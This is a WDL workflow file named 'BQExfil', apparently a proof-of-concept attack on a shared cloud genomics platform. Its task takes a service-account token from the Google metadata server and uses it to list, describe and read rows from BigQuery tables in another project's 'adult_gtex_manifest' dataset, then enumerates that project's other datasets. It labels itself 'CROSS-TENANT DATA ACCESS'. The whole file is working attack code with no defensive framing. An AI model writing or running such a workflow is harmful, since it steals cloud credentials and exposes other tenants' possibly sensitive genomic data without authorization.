version 1.0

workflow BQExfil {
    call ReadBQ
}

task ReadBQ {
    command <<<
        echo "=== BIGQUERY CROSS-TENANT DATA ACCESS ==="
        echo "Date: $(date -u)"

        TOKEN=$(curl -s --max-time 5 -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)

        echo "=== 1. LIST TABLES IN adult_gtex_manifest ==="
        curl -s --max-time 10 \
          "https://bigquery.googleapis.com/bigquery/v2/projects/wb-cozy-coconut-8092/datasets/adult_gtex_manifest/tables" \
          -H "Authorization: Bearer $TOKEN" 2>&1

        echo "=== 2. GET TABLE SCHEMA ==="
        for table in $(curl -s --max-time 10 \
          "https://bigquery.googleapis.com/bigquery/v2/projects/wb-cozy-coconut-8092/datasets/adult_gtex_manifest/tables" \
          -H "Authorization: Bearer $TOKEN" 2>/dev/null | \
          python3 -c "import sys,json; [print(t['tableReference']['tableId']) for t in json.load(sys.stdin).get('tables',[])]" 2>/dev/null); do
            echo "--- Schema: $table ---"
            curl -s --max-time 10 \
              "https://bigquery.googleapis.com/bigquery/v2/projects/wb-cozy-coconut-8092/datasets/adult_gtex_manifest/tables/$table" \
              -H "Authorization: Bearer $TOKEN" 2>&1 | head -80
            echo ""
        done

        echo "=== 3. QUERY DATA (first 10 rows) ==="
        curl -s --max-time 30 -X POST \
          "https://bigquery.googleapis.com/bigquery/v2/projects/wb-cozy-coconut-8092/queries" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"query":"SELECT * FROM `adult_gtex_manifest`.INFORMATION_SCHEMA.TABLES","useLegacySql":false,"maxResults":10}' 2>&1

        echo ""

        echo "=== 4. READ ACTUAL DATA ==="
        for table in $(curl -s --max-time 10 \
          "https://bigquery.googleapis.com/bigquery/v2/projects/wb-cozy-coconut-8092/datasets/adult_gtex_manifest/tables" \
          -H "Authorization: Bearer $TOKEN" 2>/dev/null | \
          python3 -c "import sys,json; [print(t['tableReference']['tableId']) for t in json.load(sys.stdin).get('tables',[])]" 2>/dev/null); do
            echo "--- Data from $table (first 5 rows) ---"
            curl -s --max-time 30 -X POST \
              "https://bigquery.googleapis.com/bigquery/v2/projects/wb-cozy-coconut-8092/queries" \
              -H "Authorization: Bearer $TOKEN" \
              -H "Content-Type: application/json" \
              -d "{\"query\":\"SELECT * FROM \`wb-cozy-coconut-8092.adult_gtex_manifest.$table\` LIMIT 5\",\"useLegacySql\":false}" 2>&1 | head -100
            echo ""
        done

        echo "=== 5. CHECK OTHER DATASETS ==="
        curl -s --max-time 10 \
          "https://bigquery.googleapis.com/bigquery/v2/projects/wb-cozy-coconut-8092/datasets" \
          -H "Authorization: Bearer $TOKEN" 2>&1

        echo "=== DONE ==="
    >>>

    output {
        File result = stdout()
    }

    runtime {
        docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine"
    }
}
